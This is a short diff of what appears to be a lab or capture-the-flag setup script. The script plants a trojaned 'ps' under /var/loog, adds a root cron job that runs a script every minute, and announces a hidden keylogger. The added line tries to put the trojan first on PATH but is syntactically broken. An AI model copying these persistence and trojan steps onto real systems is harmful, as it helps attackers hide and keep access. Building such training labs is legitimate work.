@@ -81,6 +81,7 @@ chmod +x backdoored_ps.sh
 mv backdoored_ps.sh /var/loog/ps
 mkdir /var/www/log
 mv flag.sh ps_init.sh /var/www/log/
+export $PATH=/var/loog/:$PATH
 echo "* * * * * /var/www/log/ps_init.sh" >> /var/spool/cron/root
 
 # setup hidden python keylogger
